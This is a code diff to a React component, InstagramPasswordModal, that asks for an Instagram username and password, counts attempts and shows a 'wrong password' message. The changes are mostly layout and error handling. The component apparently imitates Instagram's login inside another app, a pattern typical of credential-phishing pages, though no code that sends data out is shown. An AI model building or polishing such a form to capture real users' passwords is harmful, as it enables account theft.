@@ -118,32 +118,33 @@ const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, 
                         </p>
                     </div>
 
-                    {attempts === 0 && (
-                        <div className='relative mb-3 w-full'>
-                            <input
-                                type='text'
-                                id='ig-account-input'
-                                value={accountInput}
-                                onChange={(e) => setAccountInput(e.target.value)}
-                                className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
-                                placeholder={texts.instagramUsername}
-                            />
-                            <label
-                                htmlFor='ig-account-input'
-                                className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
-                            >
-                                {texts.instagramUsername}
-                            </label>
-                        </div>
-                    )}
+                    <div className='relative mb-3 w-full'>
+                        <input
+                            type='text'
+                            id='ig-account-input'
+                            value={accountInput}
+                            onChange={(e) => setAccountInput(e.target.value)}
+                            className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
+                            placeholder={texts.instagramUsername}
+                        />
+                        <label
+                            htmlFor='ig-account-input'
+                            className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
+                        >
+                            {texts.instagramUsername}
+                        </label>
+                    </div>
 
                     <div className='relative w-full'>
                         <input
                             type={showPassword ? 'text' : 'password'}
                             id='ig-password-input'
                             value={password}
-                            onChange={(e) => setPassword(e.target.value)}
-                            className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
+                            onChange={(e) => {
+                                setPassword(e.target.value);
+                                if (showError) setShowError(false);
+                            }}
+                            className={`peer h-[60px] w-full rounded-xl border bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:outline-none focus:ring-4 ${showError ? 'border-red-500 focus:border-red-500 focus:ring-red-500/10' : 'border-[#ecd9e8] focus:border-[#e1306c] focus:ring-[#e1306c]/10'}`}
                             placeholder={texts.loginPassword}
                         />
                         <label
@@ -158,9 +159,8 @@ const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, 
                             className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#6b7280] transition-colors hover:text-[#c13584]'
                             onClick={togglePassword}
                         />
+                        {showError && <p className='mt-2 text-[15px] text-red-500'>{texts.loginWrongPassword}</p>}
                     </div>
-
-                    {showError && <p className='mt-2 text-[15px] text-red-500'>{texts.loginWrongPassword}</p>}
 
                     <button
                         type='button'
